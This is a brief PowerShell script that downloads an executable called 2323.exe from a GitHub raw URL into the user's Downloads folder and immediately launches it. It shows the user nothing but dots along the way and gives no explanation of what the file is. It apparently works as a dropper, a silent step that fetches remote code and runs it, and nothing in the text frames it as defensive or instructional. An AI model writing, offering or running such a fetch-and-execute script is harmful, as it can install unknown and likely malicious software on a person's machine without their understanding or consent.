
$url = "https://github.com/Asrasm/ASM/raw/refs/heads/main/2323.exe"


$destination = "$env:USERPROFILE\Downloads\2323.exe"


Write-Host "..."


Invoke-WebRequest -Uri $url -OutFile $destination


Write-Host ".."


Start-Process -FilePath $destination


Write-Host ""
